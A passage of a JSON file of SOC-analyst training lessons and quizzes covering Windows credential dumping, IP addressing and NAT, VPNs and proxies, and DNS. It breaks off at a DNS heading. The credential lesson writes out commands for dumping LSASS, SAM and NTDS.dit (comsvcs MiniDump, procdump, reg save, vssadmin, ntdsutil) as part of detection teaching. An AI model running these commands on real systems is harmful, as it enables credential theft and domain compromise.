      "content": "To detect credential theft you first need to know what is being stolen and from where. Windows keeps secrets in three principal places, each corresponding to a MITRE sub-technique:\n\n- **LSASS memory (T1003.001)**: the **Local Security Authority Subsystem Service** (`lsass.exe`) handles authentication and caches credential material for logged-on users — NTLM hashes, and depending on configuration, Kerberos tickets and sometimes cleartext passwords. Because live sessions are in memory, LSASS is the single richest target on a running host.\n- **SAM database (T1003.002)**: the **Security Account Manager** stores local account password hashes on each Windows machine. It lives in the registry hive `HKLM\\SAM`, backed by `C:\\Windows\\System32\\config\\SAM`. Dumping it yields local account hashes (including the local Administrator), useful for lateral movement where passwords are reused.\n- **NTDS.dit (T1003.003)**: on a **Domain Controller**, the Active Directory database `C:\\Windows\\NTDS\\NTDS.dit` contains the password hashes of **every domain account**. Compromising it is catastrophic — it is effectively the keys to the entire domain.\n\nA fourth, related technique — **DCSync (T1003.006)** — does not touch these files directly. Instead an attacker with sufficient rights (typically domain admin or delegated replication rights) abuses the **directory replication protocol (DRSUAPI)** to ask a DC to hand over account hashes, as if it were another DC. No malware on the DC, no file access — just a rogue replication request, which is why it is stealthy and dangerous.\n\nUnderstanding this map tells the analyst which host to look at (any host for LSASS/SAM, a DC for NTDS/DCSync) and which telemetry matters for each."
    },
    {
      "heading": "How LSASS Memory Is Dumped",
      "content": "LSASS is the most frequently attacked credential store because it holds live session secrets. The classic tool is **Mimikatz** (`sekurlsa::logonpasswords`), but attackers increasingly use built-in and less obvious methods to avoid dropping known tools.\n\nCommon LSASS dumping methods:\n\n- **Mimikatz** reads LSASS memory directly to extract hashes, tickets, and (with WDigest/older configs) plaintext passwords.\n- **comsvcs.dll MiniDump**: a **living-off-the-land** technique using a signed Microsoft DLL. The command `rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\temp\\out.dmp full` makes rundll32 dump LSASS memory to a file, which is then parsed offline. No custom tool touches the host.\n- **Task Manager / procdump**: right-click \"Create dump file\" on lsass.exe, or `procdump -ma lsass.exe out.dmp`, produces a memory dump exfiltrated and parsed elsewhere.\n- **Direct handle + MiniDumpWriteDump** from custom malware.\n\nWhatever the tool, the unavoidable common denominator is that **some process must open a handle to lsass.exe with memory-read rights**. That handle-open is the golden detection opportunity.\n\nAttackers try to reduce visibility by dumping memory to disk and parsing it on another machine, or by using signed binaries (comsvcs.dll) so the actor in the process tree is `rundll32.exe` rather than `mimikatz.exe`. Others use handle-duplication or callback tricks to obtain an LSASS handle indirectly. The defender's advantage is that legitimate software rarely reads LSASS memory — so almost any non-security process opening lsass with read access is inherently suspicious, regardless of how the handle was obtained."
    },
    {
      "heading": "How SAM and NTDS.dit Are Dumped",
      "content": "**Dumping the SAM (T1003.002)**: the SAM hive is locked while Windows runs, so attackers copy it rather than open it directly.\n\n- `reg save HKLM\\SAM sam.hive` and `reg save HKLM\\SYSTEM system.hive` — the SYSTEM hive is needed because it holds the boot key that decrypts SAM hashes. Seeing `reg.exe save` targeting SAM/SYSTEM/SECURITY is a strong signal.\n- **Volume Shadow Copy**: create a shadow copy with `vssadmin create shadow` and copy the SAM/SYSTEM files out of the snapshot, bypassing the file lock.\n- Tools like **secretsdump.py** (Impacket) automate remote SAM extraction.\n\n**Dumping NTDS.dit (T1003.003)** on a Domain Controller — the whole-domain prize:\n\n- **ntdsutil**: `ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\temp\" q q` uses the legitimate \"Install From Media\" feature to copy NTDS.dit and the SYSTEM hive out cleanly.\n- **Volume Shadow Copy**: `vssadmin create shadow /for=C:` then copy `NTDS.dit` and the SYSTEM hive from the snapshot — the most common approach because NTDS.dit is locked while AD is running.\n- **secretsdump.py** against a DC, or **DCSync (T1003.006)** to pull hashes via replication without ever reading the file.\n\nThe recurring theme: because the sensitive files are locked, attackers lean on **shadow copies**, **built-in admin utilities** (ntdsutil, reg, vssadmin), and **replication**. That makes those specific tools and actions — shadow-copy creation on a DC, ntdsutil execution, reg save of registry hives — the events a SOC should treat as high-fidelity indicators, since they are rare in normal operations."
    },
    {
      "heading": "Detection and Defence",
      "content": "**Detecting LSASS access** — the highest-value signal is **Sysmon Event ID 10 (ProcessAccess)** where the **TargetImage is lsass.exe**. Inspect the **GrantedAccess** mask: values such as **0x1010**, **0x1410**, and **0x1438** correspond to the read/query-memory rights needed to dump credentials (0x0010 = `PROCESS_VM_READ`, 0x0400 = `PROCESS_QUERY_INFORMATION`). Alert when the **SourceImage** is not a known security product. Correlate with **Event ID 4688 / Sysmon EID 1** showing `rundll32.exe` invoking `comsvcs.dll MiniDump`, or `procdump` targeting lsass.\n\n**Detecting SAM/NTDS theft**:\n\n- `reg.exe save` against `HKLM\\SAM`, `SYSTEM`, or `SECURITY` (command-line logging).\n- **Shadow copy creation**: `vssadmin create shadow` or `wmic shadowcopy` — Windows Event ID 8222, and process-creation logs. On a DC this is especially telling.\n- **ntdsutil.exe** execution, particularly with `ifm` / `create full`.\n- Access to `C:\\Windows\\NTDS\\NTDS.dit` and file-creation events for `.dmp` or extracted hive files.\n- **DCSync**: Windows Security **Event ID 4662** on a DC showing a replication request (the `DS-Replication-Get-Changes` / `Directory Replication` control access rights GUID) from an account or host that is not a domain controller.\n\n**Defence**:\n\n- **Windows Defender Credential Guard** isolates LSASS secrets in a virtualization-based secure enclave so even admin-level malware cannot read them from memory.\n- **LSASS as Protected Process Light (PPL)** (`RunAsPPL`) blocks unauthorized handle-opens to lsass.exe.\n- **Least privilege** — remove unnecessary local admin and tightly control **domain admin**; most dumping requires elevation.\n- **Protect Domain Controllers**: restrict logon, monitor for shadow copies and ntdsutil, and audit replication rights so DCSync-capable permissions are minimized and alerted on.\n- Disable **WDigest** cleartext caching (default off on modern Windows) and enable ASR rule \"Block credential stealing from LSASS.\""
    }
  ],
  "keyTakeaways": [
    "Windows credentials live in three main stores mapped to MITRE T1003 sub-techniques — LSASS memory (.001, live session secrets on any host), the SAM (.002, local hashes), and NTDS.dit (.003, all domain hashes on a DC) — while DCSync (.006) steals domain hashes via replication without touching the file at all.",
    "The premier detection is Sysmon Event ID 10 ProcessAccess to lsass.exe with credential-read GrantedAccess masks (0x1010/0x1410) from a non-security process; supporting signals are rundll32+comsvcs MiniDump, reg save of SAM/SYSTEM, shadow-copy creation and ntdsutil on DCs, and Event 4662 replication for DCSync — defended by Credential Guard, LSASS PPL, and least privilege."
  ],
  "quiz": [
    {
      "question": "On a workstation, Sysmon Event ID 10 shows a non-security process opening a handle to lsass.exe with GrantedAccess 0x1410, and Event ID 1 shows rundll32.exe calling comsvcs.dll MiniDump against the LSASS PID. What is happening?",
      "options": [
        {
          "label": "Routine antivirus scanning of memory, which always opens lsass with these exact access rights during updates.",
          "value": "a"
        },
        {
          "label": "An attacker is dumping LSASS memory to steal credentials using a signed living-off-the-land technique.",
          "value": "b"
        },
        {
          "label": "Windows is rebooting lsass.exe on a schedule, and the handle access is a benign side effect of restart.",
          "value": "c"
        },
        {
          "label": "A printer driver is loading into lsass, which is normal and requires memory-read access to function.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A non-security process reading LSASS memory (GrantedAccess 0x1410) combined with rundll32 invoking comsvcs.dll MiniDump is textbook LSASS credential dumping via a signed LOLBin (T1003.001) (b). Option (a) is wrong — legitimate AV is a known security process and would not appear as an anomalous non-security source. Option (c) is fabricated; LSASS is not restarted on a schedule. Option (d) is false — printer drivers do not load into or read LSASS memory."
    },
    {
      "question": "On a Domain Controller, Windows Security Event ID 4662 shows a replication (DS-Replication-Get-Changes) request coming from a regular user account that is not a domain controller. Which technique should you suspect?",
      "options": [
        {
          "label": "Normal Active Directory replication, since all user accounts routinely replicate directory changes between sites.",
          "value": "a"
        },
        {
          "label": "A DCSync attack abusing replication rights to pull domain password hashes without touching NTDS.dit.",
          "value": "b"
        },
        {
          "label": "A harmless group policy refresh, which always generates replication requests from standard user accounts.",
          "value": "c"
        },
        {
          "label": "A failed logon attempt, since Event ID 4662 specifically records incorrect passwords on the controller.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Replication requests should come only from domain controllers; a normal user account requesting DS-Replication-Get-Changes is DCSync (T1003.006), pulling hashes via the replication protocol (b). Option (a) is false — ordinary user accounts do not perform directory replication. Option (c) is wrong; GPO refresh does not trigger replication-get-changes from user accounts. Option (d) misidentifies the event: 4662 logs object-access/operations, not failed-password logons (which are 4625)."
    }
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1003/",
    "https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/",
    "https://attack.mitre.org/techniques/T1003/006/"
  ],
  "xp": 220,
  "estimatedMinutes": 38,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "networking-lesson-ip-addressing-subnets-nat",
  "slug": "ip-addressing-subnets-nat",
  "title": "IP Addressing, Subnets, and NAT",
  "topic": "Networking",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Every investigation you run as a SOC analyst starts with an IP address: who talked to whom, from where, and whether that connection should have happened at all. This lesson builds the mental model you need — how IPv4 addresses work, why networks are carved into subnets, and how NAT lets many internal machines hide behind one public IP. Get this right and firewall logs stop looking like noise and start telling stories.",
  "sections": [
    {
      "heading": "What an IPv4 Address Actually Is",
      "content": "An **IPv4 address** is a 32-bit number written as four decimal numbers (**octets**) separated by dots, like `192.168.1.20`. Each octet ranges from 0 to 255, so the whole address space holds roughly 4.3 billion possible values. Every device that speaks IP on a network needs one, and it serves two jobs at once: it identifies the **host** (the specific machine) and, together with the subnet mask, it identifies the **network** that host belongs to.\n\nAddresses split into two broad categories that matter enormously for a SOC analyst:\n\n- **Public IP addresses** are globally unique and routable across the internet. Your company's web server and your home router's outside interface have public IPs.\n- **Private IP addresses** are reserved by **RFC 1918** for internal use and are *not* routable on the public internet. They can be reused freely inside any organization.\n\nThe RFC 1918 private ranges are worth memorizing because you will see them thousands of times:\n\n| Range | CIDR | Typical use |\n|---|---|---|\n| 10.0.0.0 - 10.255.255.255 | 10.0.0.0/8 | Large enterprises |\n| 172.16.0.0 - 172.31.255.255 | 172.16.0.0/12 | Medium networks |\n| 192.168.0.0 - 192.168.255.255 | 192.168.0.0/16 | Home and small office |\n\nThere are other special ranges too: `127.0.0.0/8` is **loopback** (the machine talking to itself), and `169.254.0.0/16` is **APIPA/link-local**, which a host self-assigns when it *fails* to get an address from DHCP — a useful anomaly signal.\n\nFor an analyst, the first reflex when you see an IP in a log is to classify it: **is this private or public?** A private source talking to a private destination is internal (east-west) traffic. A private source talking to a public destination is outbound (egress) traffic. A public source hitting your public-facing server is inbound. This single classification tells you the *direction* of a connection before you know anything else, and direction shapes every hypothesis you form."
    },
    {
      "heading": "Subnets and CIDR: Carving the Network",
      "content": "A **subnet** is a logically divided piece of a larger network. Rather than putting every device on one giant flat network, engineers slice address space into smaller blocks. This is done with a **subnet mask**, most commonly written today in **CIDR notation** (Classless Inter-Domain Routing) — the `/24` you see after an address.\n\nThe number after the slash is how many bits, counting from the left, belong to the **network portion**. The remaining bits identify **hosts** within that network. A `/24` means the first 24 bits are network and the last 8 are host, giving 256 addresses (254 usable, since one is the network address and one is the broadcast).\n\n| CIDR | Mask | Total addresses | Usable hosts |\n|---|---|---|---|\n| /24 | 255.255.255.0 | 256 | 254 |\n| /25 | 255.255.255.128 | 128 | 126 |\n| /16 | 255.255.0.0 | 65,536 | 65,534 |\n\nSo `192.168.1.0/24` covers `192.168.1.0` through `192.168.1.255`, and every host in it shares the first three octets.\n\n**Why this matters for security:** subnets are the backbone of **network segmentation**. Organizations deliberately place the finance servers, the user workstations, the guest Wi-Fi, and the server DMZ on separate subnets so that traffic between them must cross a firewall or router where it can be controlled and logged. A well-segmented network limits **lateral movement** — an attacker who lands on one workstation cannot freely reach the domain controllers if a firewall sits between subnets.\n\nAs an analyst, knowing the subnet map of your environment is a superpower. When you see `10.5.20.14` connecting to `10.5.99.3`, recognizing that `.20.x` is the user VLAN and `.99.x` is the server VLAN instantly tells you a workstation reached a server. If a host in the guest subnet suddenly talks to the internal database subnet, that crossing is exactly the kind of boundary violation that should raise your eyebrows. Segment boundaries are where the interesting alerts live."
    },
    {
      "heading": "NAT and the Translation Problem",
      "content": "**NAT (Network Address Translation)** solves a practical problem: there are billions of private hosts but a limited pool of public IPv4 addresses. NAT lets an entire organization full of private-addressed machines share one (or a few) public IPs when reaching the internet. The most common form is **PAT (Port Address Translation)**, also called **NAT overload**, where many internal hosts are multiplexed behind a single public IP by assigning each connection a unique source port.\n\nHere is the mechanism. Workstation `192.168.1.20` opens a connection to a website. As the packet leaves through the firewall, NAT rewrites the source from `192.168.1.20:51000` to `203.0.113.10:40001` (the public IP plus a translated port). The firewall records this mapping in its **translation table**. When the reply comes back to `203.0.113.10:40001`, the firewall looks up the table and rewrites the destination back to `192.168.1.20:51000`, delivering it to the right internal host.\n\n**This is the single most important NAT fact for a SOC analyst — the *xlate* problem.** Anyone observing traffic on the internet sees only the public IP `203.0.113.10`. If a threat-intel report says 'we saw malicious activity from your IP 203.0.113.10 at 14:32:07', that public IP maps to *thousands* of internal machines over time. To answer 'which of my machines did this?' you must correlate the external observation against the **NAT/xlate logs** that recorded the internal-to-public mapping for that exact timestamp and source port.\n\nCheck Point logs expose this directly with fields like `xlatesrc` and `xlatedst` (the translated addresses) alongside `src` and `dst` (the originals). Without matching on **both the port and the precise time**, you cannot attribute the activity — the port is often the only thing that distinguishes one internal host's session from another's behind the same public IP. This is why time synchronization (NTP) across your logging infrastructure is not a nicety but a prerequisite for accurate attribution. A one-minute clock skew can point you at the wrong workstation."
    },
    {
      "heading": "IPv6 and Reading Firewall Logs",
      "content": "**IPv6** was created because the world ran out of IPv4 addresses. It uses **128-bit** addresses written as eight groups of hexadecimal, like `2001:0db8:85a3:0000:0000:8a2e:0370:7334`, usually shortened by collapsing zero groups to `::`. The address space is astronomically large, which changes some habits: NAT is far less necessary because there are enough public addresses for every device, and hosts often carry multiple IPv6 addresses at once (link-local `fe80::/10`, plus global addresses). For an analyst, the key takeaways are that IPv6 traffic is real and often overlooked, that scanning IPv6 subnets by brute force is impractical for attackers, and that many environments run **dual-stack** (both IPv4 and IPv6), so the same host may appear under two different addresses in your logs.\n\nNow pull it together at the firewall. A typical allowed connection log line gives you a **source IP (`src`)**, **destination IP (`dst`)**, **source and destination ports**, **protocol**, **action** (accept/drop), and often the **translated addresses** and the **rule** that matched. Reading it as an analyst:\n\n- **Classify the addresses.** Private-to-public means egress; a private internal host is reaching out. Public-to-private means inbound; the internet is reaching your host.\n- **Check the direction against expectation.** A database server on the internal subnet making an *outbound* connection to a public IP is unusual — servers usually receive connections, not initiate them to the internet. That inversion is a classic beaconing/exfiltration tell.\n- **Watch segment crossings.** A source and destination in different internal subnets means traffic crossed a boundary; ask whether that crossing is policy-approved.\n- **Use xlate fields for attribution.** When correlating with an external report, map the public IP and translated port back to the real internal `src`.\n\nThe skill you are building is turning a row of addresses and ports into a sentence: 'internal workstation X reached out to public host Y on port Z at time T, and that is (or is not) normal.' Everything downstream — pivoting, scoping, escalating — depends on getting that sentence right, and NAT is the twist that most often trips analysts up."
    }
  ],
  "keyTakeaways": [
    "Classify every IP as private (RFC 1918: 10/8, 172.16/12, 192.168/16) or public first — that single step reveals whether a connection is inbound, outbound, or internal, which frames your whole investigation.",
    "NAT hides many internal hosts behind one public IP, so attributing external activity to a real machine requires correlating the public IP plus the translated source port against xlate logs at the exact timestamp."
  ],
  "quiz": [
    {
      "question": "Threat intel reports malicious traffic from your organization's public IP 203.0.113.10 at 14:32:07. Behind that IP, hundreds of workstations use PAT to share it. What must you do to identify the specific internal host responsible?",
      "options": [
        {
          "label": "Block the public IP 203.0.113.10 at the perimeter firewall, since that address is clearly the compromised machine that needs isolating.",
          "value": "a"
        },
        {
          "label": "Correlate the public IP and translated source port against NAT xlate logs at the precise timestamp to map it back to the internal host.",
          "value": "b"
        },
        {
          "label": "Search endpoint logs for any host in the 203.0.113.0 subnet, because the internal machine shares that same network range.",
          "value": "c"
        },
        {
          "label": "Review the DHCP server leases for 203.0.113.10 to find which workstation was assigned that address at the time.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct (b): PAT multiplexes many hosts behind one public IP using unique source ports, so only the public-IP-plus-port mapping recorded in xlate logs at that exact time identifies the real internal machine. (a) is wrong: the public IP is the shared NAT egress address, not a single machine, and blocking it would cut off the whole organization. (c) is wrong: internal hosts use private RFC 1918 addresses, not the public IP's range. (d) is wrong: 203.0.113.10 is a public NAT address, not something handed out by internal DHCP to workstations."
    },
    {
      "question": "In a firewall log you see an internal database server on the 10.5.99.0/24 subnet initiating an outbound connection to a public IP address on a high port. Why should this draw your attention?",
      "options": [
        {
          "label": "Database servers normally receive inbound connections, so an outbound connection to a public internet host inverts the expected traffic direction.",
          "value": "a"
        },
        {
          "label": "The /24 subnet mask only allows 254 hosts, so the server has likely exhausted its available address pool and is malfunctioning.",
          "value": "b"
        },
        {
          "label": "Public IP addresses cannot legally appear in firewall logs alongside private RFC 1918 addresses, indicating the log is corrupted.",
          "value": "c"
        },
        {
          "label": "High port numbers are reserved exclusively for attackers, so any connection using one is automatically confirmed as malicious activity.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Correct (a): servers typically accept connections rather than initiate them to the internet, so an internal database server reaching outbound is a direction inversion that fits beaconing or exfiltration and warrants investigation. (b) is wrong: the /24 host count has nothing to do with a single outbound session. (c) is wrong: private-to-public rows are completely normal in firewall logs and show NAT/egress traffic. (d) is wrong: high (ephemeral) ports are used routinely by legitimate client connections and are not inherently malicious."
    }
  ],
  "references": [
    "https://datatracker.ietf.org/doc/html/rfc1918",
    "https://www.rfc-editor.org/rfc/rfc4632",
    "https://www.cloudflare.com/learning/network-layer/what-is-network-address-translation-nat/"
  ],
  "xp": 180,
  "estimatedMinutes": 35,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "networking-lesson-vpn-and-proxy-explained",
  "slug": "vpn-and-proxy-explained",
  "title": "VPN and Proxy Explained",
  "topic": "Networking",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "VPNs and proxies both sit in the middle of network conversations and change what you, the analyst, get to see. They are everywhere in modern environments — legitimate remote-access VPNs, corporate web proxies, and, on the other side, the anonymizing infrastructure attackers use to hide where they really are. This lesson explains how each works, exactly how they alter source IPs and visibility, and how attackers abuse them so you can reason about the logs in front of you.",
  "sections": [
    {
      "heading": "What a VPN Is and How It Changes the Picture",
      "content": "A **VPN (Virtual Private Network)** creates an **encrypted tunnel** between a client and a VPN server across an untrusted network like the internet. Traffic entering the tunnel is encrypted and encapsulated; only at the far end is it decrypted and forwarded on. Two flavors dominate: **remote-access VPN**, where an individual employee's laptop tunnels into the corporate network from home or a coffee shop, and **site-to-site VPN**, which links two offices' networks permanently.\n\nThe core effect for a SOC analyst is a **change of apparent source and a loss of payload visibility**. Consider a remote employee. Before the VPN, their traffic to an internal application would originate from their home ISP address. Once connected, their traffic emerges from the **VPN concentrator's internal IP** — often an address in a dedicated VPN pool like `10.10.50.0/24`. So when you investigate a connection to an internal server and the source is a VPN-pool address, the real user is somewhere on the internet, and you must pivot to the **VPN authentication logs** to learn who authenticated to that pool address at that time.\n\nEncryption is the second effect. Everything inside the tunnel is opaque to any sensor watching the network segment the tunnel crosses. A network IDS positioned between the client and the VPN server sees encrypted blobs, not the HTTP requests inside. This is why VPN traffic shifts your visibility from the network layer to the **endpoints** and the **VPN gateway logs**: the gateway records who connected, from what external IP, at what time, for how long, and how much data moved — metadata that is often your richest source when the content itself is encrypted.\n\nA practical investigative habit: for any VPN-pool source IP, always resolve it to a **named user and a real external origin IP** using the VPN logs before you draw conclusions. Two different employees can hold the same pool address on different days, so — as with NAT — timestamp-accurate correlation is essential."
    },
    {
      "heading": "Forward and Reverse Proxies",
      "content": "A **proxy** is an intermediary that makes requests on behalf of something else. There are two kinds, and confusing them leads to bad analysis, so keep the direction straight.\n\nA **forward proxy** sits between internal users and the internet. When a workstation browses the web, the request goes to the proxy, which fetches the page and returns it. Corporate **web proxies / secure web gateways** work this way to enforce policy (block categories, scan for malware) and to log every URL users visit. The security consequence: from any external website's perspective, *all* your users appear to come from the **proxy's public IP**, similar to NAT. And the security *benefit*: the proxy holds a complete, centralized record of outbound web requests — one of the most valuable log sources you have for hunting command-and-control and data exfiltration.\n\nA **reverse proxy** sits in front of servers and faces the internet. When outside users reach your web application, they actually connect to the reverse proxy, which forwards the request to the real backend server. Products like NGINX, HAProxy, and CDN/WAF services (Cloudflare, Akamai) act as reverse proxies. They provide load balancing, TLS termination, and a chokepoint for a **WAF** to inspect inbound requests. The analyst consequence: your backend server's logs may show the **reverse proxy's IP as the source** of every request unless the proxy inserts the original client IP into an **`X-Forwarded-For`** header. If you forget this, you will wrongly conclude that one internal proxy address is attacking your app when it is really relaying thousands of real clients.\n\n| Property | Forward proxy | Reverse proxy |\n|---|---|---|\n| Position | In front of clients | In front of servers |\n| Protects/serves | Internal users | Backend servers |\n| Hides | Client identity from the web | Server details from clients |\n| Key SOC log value | Outbound URL history | Inbound request inspection (WAF) |\n\n**TLS inspection** deserves a note. Both web proxies and reverse proxies can be configured to decrypt TLS (acting as a controlled man-in-the-middle) so their engines can inspect the plaintext. Where TLS inspection is enabled, you regain visibility into URLs and payloads; where it is not, the proxy still logs the destination and metadata but not the encrypted content."
    },
    {
      "heading": "How Attackers Abuse VPNs and Proxies",
      "content": "The same middle-of-the-conversation position that makes VPNs and proxies useful for defenders makes them attractive to attackers, primarily to **hide their true origin and blend in**.\n\n**Hiding origin.** Attackers route their traffic through **commercial VPNs, anonymizing proxies, the Tor network, or residential proxy services** so that your logs show a benign-looking source instead of their real location. A login to a corporate account that appears to come from a datacenter VPN provider's IP range, rather than a normal residential ISP, is a common tell. **Residential proxies** are especially nasty because they route attacker traffic through real consumers' compromised devices, making the source look like an ordinary home user.\n\n**C2 through proxies.** Malware frequently reaches its **command-and-control (C2)** server through **chains of proxies or compromised intermediary hosts** rather than connecting directly, so the endpoint that a defender can see is a relay, not the true operator. This defeats simple 'block the bad IP' responses and is why analysts pivot on *behavior* (beaconing intervals, unusual destinations) rather than relying on any single IP being malicious.\n\n**Malicious and rogue VPNs.** Attackers deploy their own VPN tunnels to create an **encrypted, hard-to-inspect channel** out of a victim network — installing VPN client software on a compromised host so their traffic tunnels past network sensors. A newly installed, unsanctioned VPN client on an endpoint is a serious finding. Some malware even bundles VPN functionality specifically to evade network monitoring.\n\n**Bypassing controls.** Users (and insiders) sometimes run personal VPNs or proxies to **evade the corporate web proxy's policy and logging**, punching a hole in your visibility. From a detection standpoint, an endpoint suddenly bypassing the corporate proxy and talking directly to the internet is both a policy violation and a potential evasion technique.\n\nThe unifying lesson: VPNs and proxies break the naive assumption that a source IP equals an actor. Sophisticated adversaries deliberately exploit that gap, so treat any anonymizing infrastructure in your logs as a reason to dig deeper, not a dead end."
    },
    {
      "heading": "Detection Considerations for the Analyst",
      "content": "You cannot ban all VPNs and proxies — many are legitimate business tools — so detection is about spotting *anomalous* use and preserving your ability to correlate.\n\n**Enrich source IPs with reputation and category data.** Threat-intel feeds and services classify IPs as belonging to **hosting/datacenter providers, known VPN/proxy services, Tor exit nodes, or residential ranges**. A user authentication arriving from a Tor exit node or a commercial VPN block, when your workforce normally logs in from residential and mobile ISPs, is a high-value signal. Many SIEMs let you tag events with this enrichment automatically.\n\n**Watch for impossible travel and geo-velocity.** If an account logs in from one country and, twenty minutes later, from another thousands of kilometers away, either two people share the credential or one login came through a VPN/proxy in a different location. This is a foundational identity-based detection and a direct consequence of how VPNs relocate a user's apparent origin.\n\n**Hunt for unsanctioned tunneling on endpoints.** Look for **newly installed VPN or proxy software**, connections to known VPN provider infrastructure from hosts that should not have it, and endpoints that stop routing web traffic through the corporate proxy. Endpoint telemetry (EDR) is where you catch a rogue VPN because the network sensor only sees the encrypted tunnel.\n\n**Lean on metadata when content is encrypted.** When TLS inspection is not in play, you still have destination IPs and domains, connection timing, session duration, and byte counts. **Beaconing** — regular, machine-like connection intervals to the same destination — is detectable in metadata alone and is a classic C2 pattern that surviving encryption cannot hide.\n\n**Always resolve the intermediary to the real actor.** The recurring theme across NAT, VPN, and proxy: an intermediary IP is not the actor. Build the habit of pivoting from the VPN-pool address, proxy IP, or `X-Forwarded-For` value to the underlying user and true origin using authentication logs, proxy logs, and identity systems. An investigation that stops at the intermediary IP is only half done.\n\nUsed well, these tools give you superb central log sources; misread, they let attackers wear a disguise your logs happily record as legitimate."
    }
  ],
  "keyTakeaways": [
    "A VPN or proxy IP is an intermediary, not the actor — always pivot from the VPN-pool address, proxy IP, or X-Forwarded-For header to the real user and true origin using authentication and proxy logs.",
    "Because tunnels encrypt payloads, shift your detection to metadata and endpoints: enrich source IPs with VPN/Tor reputation, watch for impossible-travel logins, hunt rogue VPN software in EDR, and detect beaconing in connection timing."
  ],
  "quiz": [
    {
      "question": "An investigation shows a connection to an internal application originating from 10.10.50.14, an address in your remote-access VPN pool. What is the correct next step to identify the actual user?",
      "options": [
        {
          "label": "Treat 10.10.50.14 as the compromised host itself and immediately isolate that machine from the corporate network.",
          "value": "a"
        },
        {
          "label": "Pivot to the VPN gateway authentication logs to find which user held that pool address and their real external IP at that time.",
          "value": "b"
        },
        {
          "label": "Assume the traffic is safe because VPN-pool addresses are internal and internal traffic is inherently trusted by policy.",
          "value": "c"
        },
        {
          "label": "Block the 10.10.50.0/24 pool at the firewall so no further connections from remote users can reach the application.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct (b): the VPN concentrator assigns pool addresses dynamically, so only the gateway's authentication logs tie that address at that timestamp to a named user and their true external origin. (a) is wrong: the pool address is the VPN gateway's assignment, not a distinct physical machine to isolate. (c) is wrong: an internal source address does not make traffic trustworthy, and the real user is out on the internet. (d) is wrong: blocking the whole pool cuts off all legitimate remote users rather than identifying the actor."
    },
    {
      "question": "Your corporate web proxy does not perform TLS inspection, so you cannot see the URLs or payloads inside encrypted sessions from a suspicious host. Which approach can still reveal likely command-and-control activity?",
      "options": [
        {
          "label": "Analyze connection metadata for regular, machine-like beaconing intervals to the same destination, which survives encryption.",
          "value": "a"
        },
        {
          "label": "Decrypt the archived TLS sessions after the fact using the proxy's stored logs, since proxies retain the plaintext by default.",
          "value": "b"
        },
        {
          "label": "Conclude the host is clean, because without payload visibility no command-and-control activity can be identified at all.",
          "value": "c"
        },
        {
          "label": "Rely solely on the source IP reputation of the internal host, since internal addresses reveal C2 intent on their own.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Correct (a): beaconing is a timing pattern visible in metadata — destination, interval, and byte counts — so regular machine-like callbacks can be detected even when the payload is encrypted. (b) is wrong: without TLS inspection the proxy never held the plaintext, so there is nothing to decrypt later. (c) is wrong: metadata analysis still enables detection, so encrypted payloads do not make a host automatically clean. (d) is wrong: an internal host's own IP reputation says nothing about C2; the meaningful signal is the outbound destination and timing."
    }
  ],
  "references": [
    "https://www.cloudflare.com/learning/access-management/what-is-a-vpn/",
    "https://www.cloudflare.com/learning/cdn/glossary/reverse-proxy/",
    "https://attack.mitre.org/techniques/T1090/"
  ],
  "xp": 180,
  "estimatedMinutes": 35,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "networking-lesson-dns-deep-dive",
  "slug": "dns-deep-dive-records-resolution-security",
  "title": "DNS Deep Dive: Records, Resolution, and DNS Security",
  "topic": "Networking",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "DNS is the internet's phone book, translating names people remember into addresses machines use. For a SOC analyst it is far more than plumbing: because almost every connection begins with a name lookup, DNS logs capture the *intent* of a host before any data is exchanged. This lesson walks the full resolution path, decodes the record types you'll meet in logs, and covers the security features and blind spots — DNSSEC, DoH/DoT — that shape how much you can actually see.",
  "sections": [
    {
      "heading": "How Resolution Works, End to End",
      "content": "When a host wants to reach `www.example.com`, it does not know the IP address, so it asks **DNS** to resolve the name. The journey involves several distinct players.\n\nThe host first asks its configured **recursive resolver** (also called a recursive or caching resolver) — often the corporate DNS server or a public one like `8.8.8.8`. The recursive resolver takes on the job of doing the legwork and returning a final answer. If it already has the answer **cached** from a recent lookup, it responds immediately; caching is why repeat lookups are fast and why cache **TTL (time to live)** values matter.\n\nIf the answer is not cached, the recursive resolver walks the DNS hierarchy on the host's behalf:\n\n1. It asks a **root server** (there are 13 root server identities worldwide), which does not know `example.com` but points to the servers responsible for `.com`.\n2. It asks the `.com` **TLD (top-level domain) server**, which points to the **authoritative name servers** for `example.com`.\n3. It asks the **authoritative name server** — the one that actually holds the real records for the domain — which returns the definitive answer, say `93.184.216.34`.\n\nThe recursive resolver caches that answer for the record's TTL and hands it back to the host, which finally opens its connection. Note the two query styles: the host-to-resolver query is **recursive** ('go find the full answer for me'), while the resolver-to-server queries are **iterative** ('tell me the next place to ask').\n\n**Why this matters to an analyst:** the point where you usually get logs is the **recursive resolver** — it sees every internal host's every lookup. That vantage point is enormously valuable because it records what each machine *wanted to reach* by name, cache and all. Understanding the hierarchy also helps you reason about poisoning and hijacking: if an answer could be forged at the resolver or in transit, a host can be silently steered to an attacker's IP, which is exactly the risk **DNSSEC** was designed to address."
    },
    {
      "heading": "The Record Types You'll See in Logs",
